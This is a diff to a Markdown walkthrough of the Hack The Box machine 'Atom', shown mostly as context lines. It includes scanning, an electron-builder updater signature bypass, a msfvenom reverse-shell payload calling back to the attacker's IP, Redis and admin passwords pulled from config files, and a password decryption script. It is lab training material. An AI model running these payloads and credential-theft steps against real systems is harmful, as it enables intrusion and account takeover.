@@ -86,7 +86,7 @@ Host script results:
 
 Nmap reveals that target is running HTTP/s and SMB service on Windows 10 Pro OS.  Let’s do a full scan, just to be sure that we are not missing any non-popular ports.
 
-\## Full Port scan
+## Full Port scan
 
 ```
 ⛩\> nmap -p- -Pn -v 10.129.137.129
@@ -108,7 +108,7 @@ PORT     STATE SERVICE
 
 As you can see full port scan revealed Redis (6379) and Wsman (5985). Let’s perform a service scan on these new found ports.
 
-\##Service Scan
+##Service Scan
 
 ```
 ⛩\> nmap -p 80,135,445,5985,6379,7680 -sC -sV -Pn -v 10.129.137.129
@@ -156,7 +156,7 @@ Host script results:
 
 Let’s do SMB enumeration for any shared folders.
 
-\##SMB Share Enumeration
+##SMB Share Enumeration
 
 ```
 ⛩\> nmap -p445 --script smb-enum-shares 10.129.137.129
@@ -194,7 +194,7 @@ Host script results:
 
 We got one shared directory which is worth looking into. Let’s access it via SmbClient.
 
-\##Access SMB share and download PDF
+##Access SMB share and download PDF
 
 ```
 ⛩\> smbclient //10.129.137.129/Software_Updates -N
@@ -215,7 +215,7 @@ smb: \>
 
 We have couple fodlers and a PDF, lrt’s download it and read.
 
-\## App built on electron-builder
+## App built on electron-builder
 
 ![Screen Shot 2021-04-19 at 01.21.50.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/64BCA608-2B6F-4067-A6A4-BC6C67C11917/E0E4BAB8-8FDB-4B34-8BAE-F680F462CCB9_2)
 
@@ -225,7 +225,7 @@ The note taking app is built using electron-builder, and if we drop our executab
 
 After a quick google, we get a blog describing about RCE via electron-builder updater. Read the blog to understand how this vulnerability will used in our condition.
 
-\## Vulnerability link
+## Vulnerability link
 
 [https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html](https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html)
 
@@ -233,7 +233,7 @@ After a quick google, we get a blog describing about RCE via electron-builder up
 
 Let’s build our reverse executable via msfvenom and name it as up'date.exe
 
-\## Create reverse shell
+## Create reverse shell
 
 ```
 ⛩\> msfvenom -p windows/x64/shell_reverse_tcp -f exe lhost=10.10.14.42 lport=1234 -o "up'date.exe"
@@ -247,7 +247,7 @@ Saved as: up'date
 
 Now we need to generate signature hash of this up’date.exe. This can be easily achieved by using a filename containing a single quote and then by recalculating the file hash to match the attacker-provided binary.
 
-\## Create signature
+## Create signature
 
 ```
 ⛩\> shasum -a 512 up\'date.exe | cut -d " " -f1 | xxd -r -p | base64
@@ -256,7 +256,7 @@ jAUiMEfUaQSD6tvtKmjG4kk9fJo/lyZBbP0/16id9lPwdyqCw5rKvbvJaCbmLE/1QMukQ8WBn/hDdL81
 
 Now create a YML file and add the details of the file name, signature and version.
 
-\## Create yml file
+## Create yml file
 
 ```
 ⛩\> cat latest.yml
@@ -265,7 +265,7 @@ path: up'date.exe
 sha512: jAUiMEfUaQSD6tvtKmjG4kk9fJo/lyZBbP0/16id9lPwdyqCw5rKvbvJaCbmLE/1QMukQ8WBn/hDdL81I/UOqQ==
 ```
 
-\## Set netcat listener
+## Set netcat listener
 
 ```
 ⛩\> nc -lvnp 1234
@@ -274,7 +274,7 @@ listening on [any] 1234 ...
 
 Now we need to upload executable and yml file to SMB client folder.
 
-\## Upload reverse shell and yml
+## Upload reverse shell and yml
 
 ```
 ⛩\> smbclient //atom.htb/Software_updates -N
@@ -298,7 +298,7 @@ smb: \client1\>
 
 Upon upload we’d get a reverse connection on our machine.
 
-\## Reverse Connection
+## Reverse Connection
 
 ```
 ⛩\> nc -lvnp 1234
@@ -314,7 +314,7 @@ atom\jason
 C:\WINDOWS\system32>
 ```
 
-\## User Flag
+## User Flag
 
 ```
 PS C:\> cd users/jason/desktop
@@ -394,7 +394,7 @@ d-----          4/2/2021   7:17 AM                Plugins
 
 For that we need to read the configuration file of kanban.
 
-\## Read the config file
+## Read the config file
 
 ```
 PS C:\Users\jason\Downloads\PortableKanban> get-content PortableKanban.cfg
@@ -407,7 +407,7 @@ get-content PortableKanban.cfg
 
 It looks like redis is being used with kanban. Let’s access Redis configuration file for any stored credentials.
 
-\## Read redis config file
+## Read redis config file
 
 ```
 PS C:\Program Files\redis> get-childitem
@@ -447,7 +447,7 @@ requirepass kidvscat_yes_kidvscat
 
 We got the Redis credentials, let’s access Redis via our machine. FOr that we need redis-cli application. We can install it via package manager.
 
-\## Install Redis-Tools
+## Install Redis-Tools
 
 ```
 ⛩\> sudo apt install redis-tools
@@ -455,7 +455,7 @@ We got the Redis credentials, let’s access Redis via our machine. FOr that we 
 
 Let’s authenticate via found credentials and look for any stored keys.
 
-\## Access remote redis
+## Access remote redis
 
 ```
 ⛩\> redis-cli -h atom.htb -a 'kidvscat_yes_kidvscat'
@@ -472,13 +472,13 @@ atom.htb:6379>
 
 We found the Administrator key but it is encrypted. We can decrypt via this python code.
 
-\## Decrypt PK password
+## Decrypt PK password
 
 [Offensive Security’s Exploit Database Archive](https://www.exploit-db.com/exploits/49409)
 
 We need to modify our code to accept our key.
 
-\## Modify code 1
+## Modify code 1
 
 ```
 #!/bin/python3
@@ -493,7 +493,7 @@ def decode(hash):
 print(decode('Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi'))
 ```
 
-\## Modify code 2
+## Modify code 2
 
 ```
 #!/bin/python3
@@ -510,14 +510,14 @@ except:
     print("Wrong Hash")
 ```
 
-\## Run code
+## Run code
 
 ```
 ⛩\> python3 kan1.py
 kidvscat_admin_@123
 ```
 
-\## Access Admin and read flag
+## Access Admin and read flag
 
 ```
 ⛩\> evil-winrm -i atom.htb -u administrator -p 'kidvscat_admin_@123'
